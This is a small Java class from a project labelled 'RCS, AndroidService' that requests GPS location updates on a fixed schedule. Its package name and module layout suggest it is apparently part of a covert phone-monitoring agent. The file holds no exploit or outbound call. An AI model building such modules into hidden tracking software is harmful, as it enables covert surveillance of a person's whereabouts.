/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : GPSLocatorPeriod.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module.position;

import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Looper;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

public class GPSLocatorPeriod extends GPSLocator {
	private static final String TAG = "GPSLocatorPeriod";

	private final int period;

	public GPSLocatorPeriod(LocationListener listener, int period) {
		super();
		this.period = period;

		setListener(listener);
	}

	public void initLocationUpdates() {
		lm.requestLocationUpdates(provider, period, 0L, listener);
	}
}
